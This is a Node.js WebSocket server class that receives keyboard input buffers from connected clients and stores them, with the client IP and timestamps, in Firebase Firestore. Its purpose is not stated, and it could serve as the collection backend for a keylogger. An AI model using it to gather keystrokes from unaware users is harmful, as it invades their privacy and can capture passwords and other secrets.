const WebSocket = require('ws');
const moment = require('moment-timezone');
const { initializeApp } = require("firebase/app");
const { getFirestore, collection, addDoc } = require("firebase/firestore");

class SocketServer {
    constructor(firebaseConfig, port = 8080) {
        this.firebaseConfig = firebaseConfig;
        this.port = port;
        this.app = initializeApp(this.firebaseConfig);
        this.db = getFirestore(this.app);
        this.wss = new WebSocket.Server({ port: this.port });

        this.initialize();
    }

    initialize() {
        this.wss.on('connection', (ws) => {
            this.handleConnection(ws);
        });
        console.log("Socket server ready!");
    }

    async handleConnection(ws) {
        try {
            const clientIp = ws._socket.remoteAddress;
            console.log(`Client connected from ${clientIp}`);

            const tokyoTime = moment().tz("Asia/Tokyo").format();
            const logData = this.createLogData(clientIp, "connection", tokyoTime, `Client connected from ${clientIp}`);
            await addDoc(collection(this.db, `Events_${clientIp}`), logData);

            ws.on('message', async (message) => this.handleMessage(ws, message));
            ws.on('close', () => this.handleClose(ws));
        } catch (err) {
            console.error("Error handling connection:", err);
        }
    }

    async handleMessage(ws, message) {
        try {
            const clientIp = ws._socket.remoteAddress;
            const data = JSON.parse(message);
            console.log(`Received input buffer: ${data.inputBuffer}`);

            const tokyoTime = moment().tz("Asia/Tokyo").format();
            const logData = this.createLogData(clientIp, "keyboard_event", tokyoTime, `Keyboard Event: ${data.inputBuffer}`, data.inputBuffer, data.event);
            await addDoc(collection(this.db, `Events_${clientIp}`), logData);
        } catch (err) {
            console.error("Error handling message:", err);
        }
    }

    async handleClose(ws) {
        try {
            const clientIp = ws._socket.remoteAddress;
            const tokyoTime = moment().tz("Asia/Tokyo").format();
            const logData = this.createLogData(clientIp, "disconnection", tokyoTime, `Client disconnected from ${clientIp}`);
            await addDoc(collection(this.db, `Events_${clientIp}`), logData);

            console.log(`Client disconnected from ${clientIp}`);
        } catch (err) {
            console.error("Error on ws close:", err);
        }
    }

    createLogData(ip, type, timestamp, message, data = null, detail = null) {
        return {
            ip,
            type,
            timestamp,
            message,
            data,
            detail,
        };
    }
}

module.exports = SocketServer;